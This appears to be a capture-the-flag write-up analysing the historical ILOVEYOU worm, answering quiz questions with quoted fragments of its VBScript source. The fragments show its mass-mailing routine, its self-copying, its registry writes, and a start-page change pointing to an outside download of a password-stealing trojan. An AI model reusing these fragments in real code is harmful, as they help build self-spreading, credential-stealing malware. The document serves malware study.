# ILOVEYOU

ILOVEYOU the 3 magical words which have an impact in most of the people's life.
On the other hand these 3 words don't need any introduction for the people in the Infosec industry. <br>

Let's relive history by analysing the ‘ILOVEYOU’ malware.

# Questions

## What is the text present as part of email when the victim received this malware? 

Checking the malware, there is a subroutine named **spreadtoemail()** which sends emails to the contactlist of the infected machine. There we can see all the components of the email since the malware is not obfuscated
``` 
male.Subject = "ILOVEYOU"
male.Body = vbcrlf & "kindly check the attached LOVELETTER coming from me."
male.Attachments.Add(dirsystem & "\LOVE-LETTER-FOR-YOU.TXT.vbs")
```
**Answer:** kindly check the attached LOVELETTER coming from me.

## What is the domain name that was added as the browser's homepage? 

We can see the malware modifying the Internet Explorer Registry keys for the initial page
```
regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\StartPage", "http://www.skyinet.net/~young1s/HJKhjnwerhjkxcvytwertnMTFwetrdsfmhPnjw6587345gvsdf7679njbvYT/WIN-BUGSFIX.exe"
```
**Answer:** http://skyinet.net

## The malware replicated itself into 3 locations, what are they?

```
c.Copy(dirsystem & "\MSKernel32.vbs")               -> C:\Windows\System32\MSKernel32.vbs
c.Copy(dirwin & "\Win32DLL.vbs")                    -> C:\Windows\Win32DLL.vbs
c.Copy(dirsystem & "\LOVE-LETTER-FOR-YOU.TXT.vbs")  -> C:\Windows\System32\LOVE-LETTER-FOR-YOU.TXT.vbs
```
**Answer:** C:\Windows\System32\MSKernel32.vbs, C:\Windows\System32\LOVE-LETTER-FOR-YOU.TXT.vbs, C:\Windows\Win32DLL.vbs

Note: It needed to be in this sequence for some reason

## What is the name of the file that looks for the filesystem? 

Well, not much to say, just by reading the source code we get the answer
```
rem Check if a file named "WinFAT32.exe" exists in the system files.
```
**Answer:** WinFAT32.exe

## Which file extensions, beginning with m, does this virus target?

Same as before, just reading
```
ElseIf (ext = "mp3") Or (ext = "mp2") Then
```
**Answer:** mp2, mp3

## What is the name of the file generated when the malware identifies any Internet Relay Chat service? 

Once again... just read the code
```
rem Looks for mIRC and related files to determine whether it
rem should create/replace its script.ini with a malicious script.
```
**Answer:** script.ini

## What is the name of the password stealing trojan that is downloaded by the malware?

[Source] (https://www.f-secure.com/v-descs/love.shtml)
```
The executable part the LoveLetter worm downloads from the web is a password stealing trojan. On the system startup the trojan tries to find a hidden window named 'BAROK...'. If it is present, the trojan exits immediately, in other case the main routine takes control. 
```

**Answer:** BAROK

## What is the name of the email service that is targeted by the malware?

```
Set out = WScript.CreateObject("Outlook.Application")
```
**Answer:** Outlook

## What is the registry entry responsible for reading the contacts of the logged in email account?

``` 
rem Goes through all contacts in the address book and sends an email
  rem with the LOVE-LETTER-FOR-YOU program as an attachment.
  For ctrlists = 1 To mapi.AddressLists.Count
    Set a = mapi.AddressLists(ctrlists)
    x = 1
    regv = regedit.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\" & a)
```
**Answer:** HKEY_CURRENT_USER\Software\Microsoft\WAB\

## What is the value that is stored in the registry to remember that an email was already sent to a user?

We can see, after the email is composed and sent, that a registry key is modified

```
ACTION           KEY                                                 VALUE  SIZE
regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\" & malead, 1, "REG_DWORD"
```
**Answer:** 1